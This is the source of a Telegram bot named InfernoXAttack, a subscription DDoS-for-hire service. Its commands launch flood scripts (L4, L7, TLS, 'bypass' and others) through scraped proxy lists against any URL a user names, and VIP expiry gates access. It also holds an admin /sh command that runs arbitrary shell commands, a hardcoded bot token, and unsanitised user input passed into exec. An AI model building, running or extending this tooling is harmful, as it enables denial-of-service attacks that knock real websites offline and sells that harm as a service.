const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');
const cheerio = require('cheerio');
const CFonts = require('cfonts');
const figlet = require("figlet")
const token = '7995936386:AAH9IXFZmLBno6BTX_i6h_PenCgVHrb7FX0';
const bot = new TelegramBot(token, {polling: true});
const adminData = JSON.parse(fs.readFileSync('admin.json', 'utf8'));
const adminIds = adminData.admins;
const timeLimit = parseInt(adminData.limit, 10);

console.log(figlet.textSync('随缘', {
    font: 'Standard',
    horizontalLayout: 'default',
    vertivalLayout: 'default',
    whitespaceBreak: false
  }))
  
    bot.on('message', (msg) => {
        const nama = msg.from?.first_name || msg.from?.username || 'Anonymous'; // Improved name handling
        const username = msg.from?.username || 'Anonymous'; 
        const userId = msg.from?.id || 'Unknown ID'; // Handle cases where ID might not be available
        const message = msg.text || msg.caption || 'Media atau pesan lain'; // Include caption for media messages

        console.log(`\x1b[97m──⟨ \x1b[42m\x1b[97m[ @${nama} ]\x1b[50m[ @${username} ]\x1b[44m\x1b[35m[ ${userId} ]\x1b[0m`);
        console.log(`\x1b[31mPesan: \x1b[0m${message}\x1b[0m\n`);
    });

let processes = {};
const stopProcesses = (chatId) => {
  if (processes[chatId]) {
    processes[chatId].forEach(proc => proc.kill());
    processes[chatId] = [];
    bot.sendMessage(chatId, 'The process was successfully terminated.');
  } else {
    bot.sendMessage(chatId, 'There are no processes running.');
  }
};
const urls = [
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=100',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=110',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=96',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=88',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=5',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=6',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=7',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=8',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=9',
  'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=10',
  'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
  'https://api.good-proxies.ru/getfree.php?count=1000&key=freeproxy',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
];

async function scrapeProxies(chatId) {
  let proxies = [];
  const totalUrls = urls.length;
  let progressMessage = await bot.sendMessage(chatId, 'Getting Started Changing the proxy\n{ 0% }');

  for (let i = 0; i < totalUrls; i++) {
    try {
      const { data } = await axios.get(urls[i]);
      const $ = cheerio.load(data);

      $('tr').each((j, elem) => {
        const ip = $(elem).find('td').eq(0).text().trim();
        const port = $(elem).find('td').eq(1).text().trim();
        if (ip && port) {
          proxies.push(`${ip}:${port}`);
        }
      });
    } catch (error) {
      console.error(`Error scraping ${urls[i]}:`, error);
    }
    const progress = Math.round(((i + 1) / totalUrls) * 100);
    await bot.editMessageText(`Starting to Change Proxy\n{ ${progress}% }`, {
      chat_id: chatId,
      message_id: progressMessage.message_id
    });
  }
  fs.writeFileSync('proxy.txt', proxies.join('\n'), 'utf8');
  await bot.editMessageText('Proxy Updated Successfully', {
    chat_id: chatId,
    message_id: progressMessage.message_id
  });

  console.log(`Scraped ${proxies.length} proxies and saved to proxy.txt`);
}

bot.onText(/\/start/, (msg) => {
const name = msg.from.first_name;
  bot.sendMessage(msg.chat.id, 
`Welcome ${name}, Let's Down
  
Bot - InfernoXAttack
Owner - @Core_Dex_X

DDOS PRIVATE METHODS
• /bypass [Url] [Time]
• /AttackL4 [Url] [Time]
• /AttackL7 [Url] [Time]
• /Tls [Url] [Time]
• /Tlsvip [Url] [Time]
• /随缘 [Url] [Time]
• /随缘-XcV [Url] [Time]
• /MakLu [Url] [Time]
• /Kontol [Url] [Time]
• /FLOOD [Url] [Time]
• /Kill [Url] [Time]

Web Information
• /info [Url]

Proxy Scraper
• /upproxy

IP Address Checker
• /checkip [IP]

TinyURL Generator
• /tinyurl [Url]

Owner
• /owner

  `);
});
  
});

bot.onText(/^\/AttackL7(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Where is target?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Where the time?');
    return;
  }
   try {
      const vipData = JSON.parse(fs.readFileSync('vip.json', 'utf8'));
      const userVip = vipData[chatId];
      
      if (!userVip) {
        bot.sendMessage(chatId, 'You are not a VIP. Please buy VIP to use this command.');
        return;
      }
      
      // Check if the VIP expiration timestamp is still in the future.
      if (userVip.expires < Date.now()) {
        bot.sendMessage(chatId, 'Your VIP subscription has expired. Please renew your VIP status.');
        return;
      }
    } catch (err) {
      console.error('Error reading vip.json:', err);
      bot.sendMessage(chatId, 'Error verifying VIP status. Please try again later.');
      return;
    }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Invalid time or time limit exceeded ${timeLimit}.`);
    return;
  }
  const process = exec(`node AttackL7.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nConcurents: 1\nMethods: AttackL7`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/随缘-XcV(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Where is target?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Where the time?');
    return;
  }
 try {
      const vipData = JSON.parse(fs.readFileSync('vip.json', 'utf8'));
      const userVip = vipData[chatId];
      
      if (!userVip) {
        bot.sendMessage(chatId, 'You are not a VIP. Please buy VIP to use this command.');
        return;
      }
      
      // Check if the VIP expiration timestamp is still in the future.
      if (userVip.expires < Date.now()) {
        bot.sendMessage(chatId, 'Your VIP subscription has expired. Please renew your VIP status.');
        return;
      }
    } catch (err) {
      console.error('Error reading vip.json:', err);
      bot.sendMessage(chatId, 'Error verifying VIP status. Please try again later.');
      return;
    }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Invalid time or time limit exceeded ${timeLimit}.`);
    return;
  }
  const process = exec(`node Zamss-XcV.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All server\nTarget: ${target}\nTime: ${time}\nConcurents: 1\nMethods: 随缘-XcV`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/随缘(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Where is target?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Where the time?');
    return;
  }
 try {
      const vipData = JSON.parse(fs.readFileSync('vip.json', 'utf8'));
      const userVip = vipData[chatId];
      
      if (!userVip) {
        bot.sendMessage(chatId, 'You are not a VIP. Please buy VIP to use this command.');
        return;
      }
      
      // Check if the VIP expiration timestamp is still in the future.
      if (userVip.expires < Date.now()) {
        bot.sendMessage(chatId, 'Your VIP subscription has expired. Please renew your VIP status.');
        return;
      }
    } catch (err) {
      console.error('Error reading vip.json:', err);
      bot.sendMessage(chatId, 'Error verifying VIP status. Please try again later.');
      return;
    }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Invalid time or time limit exceeded ${timeLimit}.`);
    return;
  }
  const process = exec(`node zamss.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nConcurents: 1\nMethods: 随缘`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Tlsvip(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Where is target?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Where the time?');
    return;
  }
 try {
      const vipData = JSON.parse(fs.readFileSync('vip.json', 'utf8'));
      const userVip = vipData[chatId];
      
      if (!userVip) {
        bot.sendMessage(chatId, 'You are not a VIP. Please buy VIP to use this command.');
        return;
      }
      
      // Check if the VIP expiration timestamp is still in the future.
      if (userVip.expires < Date.now()) {
        bot.sendMessage(chatId, 'Your VIP subscription has expired. Please renew your VIP status.');
        return;
      }
    } catch (err) {
      console.error('Error reading vip.json:', err);
      bot.sendMessage(chatId, 'Error verifying VIP status. Please try again later.');
      return;
    }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Invalid time or time limit exceeded ${timeLimit}.`);
    return;
  }
  const process = exec(`node Tlsvip.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nConcurents: 1\nMethods: Tlsvip`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Tls(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Where is target?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Where the time?');
    return;
  }
 try {
      const vipData = JSON.parse(fs.readFileSync('vip.json', 'utf8'));
      const userVip = vipData[chatId];
      
      if (!userVip) {
        bot.sendMessage(chatId, 'You are not a VIP. Please buy VIP to use this command.');
        return;
      }
      
      // Check if the VIP expiration timestamp is still in the future.
      if (userVip.expires < Date.now()) {
        bot.sendMessage(chatId, 'Your VIP subscription has expired. Please renew your VIP status.');
        return;
      }
    } catch (err) {
      console.error('Error reading vip.json:', err);
      bot.sendMessage(chatId, 'Error verifying VIP status. Please try again later.');
      return;
    }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Invalid time or time limit exceeded ${timeLimit}.`);
    return;
  }
  const process = exec(`node Tls.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nConcurents: 1\nMethods: Tls`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/AttackL4(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Where is target?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Where the time?');
    return;
  }
 try {
      const vipData = JSON.parse(fs.readFileSync('vip.json', 'utf8'));
      const userVip = vipData[chatId];
      
      if (!userVip) {
        bot.sendMessage(chatId, 'You are not a VIP. Please buy VIP to use this command.');
        return;
      }
      
      // Check if the VIP expiration timestamp is still in the future.
      if (userVip.expires < Date.now()) {
        bot.sendMessage(chatId, 'Your VIP subscription has expired. Please renew your VIP status.');
        return;
      }
    } catch (err) {
      console.error('Error reading vip.json:', err);
      bot.sendMessage(chatId, 'Error verifying VIP status. Please try again later.');
      return;
    }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Invalid time or time limit exceeded ${timeLimit}.`);
    return;
  }
  const process = exec(`node AttackL4.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nConcurents: 1\nMethods: AttackL4`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/bypass(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Where is target?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Where the time?');
    return;
  }
 try {
      const vipData = JSON.parse(fs.readFileSync('vip.json', 'utf8'));
      const userVip = vipData[chatId];
      
      if (!userVip) {
        bot.sendMessage(chatId, 'You are not a VIP. Please buy VIP to use this command.');
        return;
      }
      
      // Check if the VIP expiration timestamp is still in the future.
      if (userVip.expires < Date.now()) {
        bot.sendMessage(chatId, 'Your VIP subscription has expired. Please renew your VIP status.');
        return;
      }
    } catch (err) {
      console.error('Error reading vip.json:', err);
      bot.sendMessage(chatId, 'Error verifying VIP status. Please try again later.');
      return;
    }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Invalid time or time limit exceeded ${timeLimit}.`);
    return;
  }
  const process = exec(`node bypass.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nConcurents: 1\nMethods: bypass`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/MakLu(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Where is target?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Where the time?');
    return;
  }
 try {
      const vipData = JSON.parse(fs.readFileSync('vip.json', 'utf8'));
      const userVip = vipData[chatId];
      
      if (!userVip) {
        bot.sendMessage(chatId, 'You are not a VIP. Please buy VIP to use this command.');
        return;
      }
      
      // Check if the VIP expiration timestamp is still in the future.
      if (userVip.expires < Date.now()) {
        bot.sendMessage(chatId, 'Your VIP subscription has expired. Please renew your VIP status.');
        return;
      }
    } catch (err) {
      console.error('Error reading vip.json:', err);
      bot.sendMessage(chatId, 'Error verifying VIP status. Please try again later.');
      return;
    }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Invalid time or time limit exceeded ${timeLimit}.`);
    return;
  }
  const process = exec(`node MakLu.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nConcurents: 1\nMethods: MakLu`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Kontol(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Where is target?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Where the time?');
    return;
  }
 try {
      const vipData = JSON.parse(fs.readFileSync('vip.json', 'utf8'));
      const userVip = vipData[chatId];
      
      if (!userVip) {
        bot.sendMessage(chatId, 'You are not a VIP. Please buy VIP to use this command.');
        return;
      }
      
      // Check if the VIP expiration timestamp is still in the future.
      if (userVip.expires < Date.now()) {
        bot.sendMessage(chatId, 'Your VIP subscription has expired. Please renew your VIP status.');
        return;
      }
    } catch (err) {
      console.error('Error reading vip.json:', err);
      bot.sendMessage(chatId, 'Error verifying VIP status. Please try again later.');
      return;
    }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Invalid time or time limit exceeded ${timeLimit}.`);
    return;
  }
  const process = exec(`node Kontol.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nConcurents: 1\nMethods: Kontol`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/FLOOD(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Where is target?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Where the time?');
    return;
  }
 try {
      const vipData = JSON.parse(fs.readFileSync('vip.json', 'utf8'));
      const userVip = vipData[chatId];
      
      if (!userVip) {
        bot.sendMessage(chatId, 'You are not a VIP. Please buy VIP to use this command.');
        return;
      }
      
      // Check if the VIP expiration timestamp is still in the future.
      if (userVip.expires < Date.now()) {
        bot.sendMessage(chatId, 'Your VIP subscription has expired. Please renew your VIP status.');
        return;
      }
    } catch (err) {
      console.error('Error reading vip.json:', err);
      bot.sendMessage(chatId, 'Error verifying VIP status. Please try again later.');
      return;
    }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Invalid time or time limit exceeded ${timeLimit}.`);
    return;
  }
  const process = exec(`node FLOOD.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nConcurents: 1\nMethods: FLOOD.js`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/Kill(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Where is target?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Where the time?');
    return;
  }
 try {
      const vipData = JSON.parse(fs.readFileSync('vip.json', 'utf8'));
      const userVip = vipData[chatId];
      
      if (!userVip) {
        bot.sendMessage(chatId, 'You are not a VIP. Please buy VIP to use this command.');
        return;
      }
      
      // Check if the VIP expiration timestamp is still in the future.
      if (userVip.expires < Date.now()) {
        bot.sendMessage(chatId, 'Your VIP subscription has expired. Please renew your VIP status.');
        return;
      }
    } catch (err) {
      console.error('Error reading vip.json:', err);
      bot.sendMessage(chatId, 'Error verifying VIP status. Please try again later.');
      return;
    }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Invalid time or time limit exceeded ${timeLimit}.`);
    return;
  }
  const process = exec(`node StarsXKill.js ${target} ${time} 35 10 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Sent Successfully All Server\nTarget: ${target}\nTime: ${time}\nConcurents: 1\nMethods: Kill`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.on('callback_query', (callbackQuery) => {
  const message = callbackQuery.message;
  const chatId = message.chat.id;

  if (callbackQuery.data === 'stop') {
    const isAdmin = adminIds.includes(chatId.toString());

    if (!isAdmin) {
      bot.sendMessage(chatId, 'You do not have permission to run this command.');
      return;
    }
    stopProcesses(chatId);
  }
});
bot.onText(/^\/upproxy$/, async (msg) => {
  const chatId = msg.chat.id;
  const isAdmin = adminIds.includes(chatId.toString());
  if (!isAdmin) {
    bot.sendMessage(chatId, 'You do not have permission to run this command.');
    return;
  }
  try {
    if (fs.existsSync('proxy.txt')) {
      fs.unlinkSync('proxy.txt');
    }
    await scrapeProxies(chatId);
  } catch (error) {
    bot.sendMessage(chatId, `An error occurred while updating the proxy: ${error.message}`);
  }
});


bot.onText(/\/sh (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const command = match[1];
  const isAdmin = adminIds.includes(chatId.toString());
  
  if (!isAdmin) {
    bot.sendMessage(chatId, 'You do not have permission to run this command.');
    return;
  }
  
  exec(command, { maxBuffer: parseInt(adminData.limit) * 1024 }, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `Error: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `Stderr: ${stderr}`);
      return;
    }
    bot.sendMessage(chatId, `Output:\n${stdout}`);
  });
});

bot.onText(/^\/info (.+)/, (msg, match) => {
 const chatId = msg.chat.id;
 const web = match[1];
 const data = {
     target: web,
     apikey: 'NOKEY'
 };
 axios.post('https://check-host.cc/rest/V2/info', data, {
    headers: {
      'accept': 'application/json',
      'Content-Type': 'application/json'
   }
 })
 .then(response => {
     const result = response.data;
     if (result.status === 'success') {
         const info = `
          
\`\`\`INFORMASI-WEB+${web}
IP:        ${result.ip}
Hostname:  ${result.hostname}
ISP:       ${result.isp}
ASN:       ${result.asn}
ORG:       ${result.org}
Country:   ${result.country}
Region:    ${result.region}
City:      ${result.city}
Timezone:  ${result.timezone}
Latitude: ${result.latitude}
Longitude: ${result.longitude}
\`\`\`
*About ASN:* \`${result.asnlink}\`
*Website:* \`https://check-host.cc/?m=INFO&target=${web}\`
         `;
         bot.sendMessage(chatId, info, { parse_mode: 'Markdown' });
     } else {
         bot.sendMessage(chatId, 'Failed to get information. Try again later.');
     }
 })
 .catch(error => {
     console.error(error);
     bot.sendMessage(chatId, 'An error occurred while contacting the API');
 });
});



bot.onText(/^(\.|\#|\/)checkip(?: (.+))?$/, async (msg, match) => {
        const chatId = msg.chat.id;
        const ip = match[2];
        if (!ip) {
            bot.sendMessage(chatId, 'Input Link! Example /checkip your ip ', { reply_to_message_id: msg.message_id });
            return;
        }

        try {
            const response = await axios.get(`https://apikey-premium.000webhostapp.com/loc/?IP=${ip}`);
            
            const data = response.data;
            bot.sendChatAction(chatId, 'typing');
            
            // Kirim informasi ke pengguna
            const message = `
🌐 Creator : @Core_Dex_X
🔍 IP : ${data.query}
📊 Status : ${data.status}
🌍 Country : ${data.country}
🗺️ Country Code : ${data.countryCode}
🏞️ Region : ${data.region}
🏡 Region Name : ${data.regionName}
🏙️ City : ${data.city}
🏘️ District : ${data.district}
🏠 Zip : ${data.zip}
🌍 Latitude : ${data.lat}
🌍 Longitude : ${data.lon}
⏰ Timezone : ${data.timezone}
📶 ISP : ${data.isp}
🏢 Organization : ${data.org}
🌐 AS : ${data.as}
            `;
            
            bot.sendMessage(chatId, message);

            // Kirim lokasi ke pengguna
            bot.sendLocation(chatId, data.lat, data.lon);
        } catch (error) {
            console.error('Error:', error);
            // Kirim pesan error jika terjadi kesalahan
            bot.sendMessage(chatId, 'An error occurred in processing the request.');
        }
    });
    
bot.onText(/^(\.|\#|\/)tinyurl(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[2];
  if (!url) {
      bot.sendMessage(chatId, 'Usage: /tinyulr [web]\nExample: /tinyulr https://web.com', { reply_to_message_id: msg.message_id });
       return;
    }
            
  // Pastikan URL dimulai dengan "http://" atau "https://"
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    bot.sendMessage(chatId, 'The URL must start with "http://" atau "https://"');
    return;
  }

  try {
    const response = await axios.get(`https://tinyurl.com/api-create.php?url=${url}`);
    const shortenedUrl = response.data;
    bot.sendChatAction(chatId, 'typing');
    bot.sendMessage(chatId, shortenedUrl);
  } catch (error) {
    console.error('Error:', error);
    bot.sendMessage(chatId, 'Sorry, an error occurred while shortening the URL.');
  }
});

// Command usage: /addvip <user_id> <duration_in_minutes>
bot.onText(/^\/addvip\s+(\d+)\s+(\d+)$/, (msg, match) => {
  const chatId = msg.chat.id;
  const targetId = match[1];
  const durationMinutes = parseInt(match[2], 10);

  // Ensure that only admins can use this command.
  if (!adminIds.includes(chatId.toString())) {
    bot.sendMessage(chatId, 'You do not have permission to add VIP users.');
    return;
  }

  if (!targetId || isNaN(durationMinutes)) {
    bot.sendMessage(chatId, 'Usage: /addvip <user_id> <duration_in_minutes>');
    return;
  }

  // Calculate the expiration timestamp in milliseconds.
  const expiryTime = Date.now() + durationMinutes * 60 * 1000;

  // Read the existing VIP data from vip.json (or initialize an empty object if the file doesn't exist).
  let vipData = {};
  try {
    if (fs.existsSync('vip.json')) {
      vipData = JSON.parse(fs.readFileSync('vip.json', 'utf8'));
    }
  } catch (error) {
    console.error('Error reading vip.json:', error);
    bot.sendMessage(chatId, 'Error reading VIP data.');
    return;
  }

  // Add or update the VIP record for the target user.
  vipData[targetId] = { expires: expiryTime };

  // Save the updated VIP data back to vip.json.
  try {
    fs.writeFileSync('vip.json', JSON.stringify(vipData, null, 2), 'utf8');
    bot.sendMessage(
      chatId,
      `VIP added for user ${targetId} until ${new Date(expiryTime).toLocaleString()}`
    );
  } catch (error) {
    console.error('Error writing vip.json:', error);
    bot.sendMessage(chatId, 'Error updating VIP data.');
  }
});


bot.onText(/\/owner/, (msg) => {
      const chatId = msg.chat.id;
      const name = msg.from.first_name;
      const buttons = [
        {
          text: 'TELEGRAM',
          url: 'https://t.me/Core_Dex_X'
        }
      ];
      bot.sendMessage(chatId, `${name}, You can connect with owner via the link below`, {
        reply_markup: {
          inline_keyboard: [buttons]
        }
      });
    });
bot.on('polling_error', (error) => console.log(error));


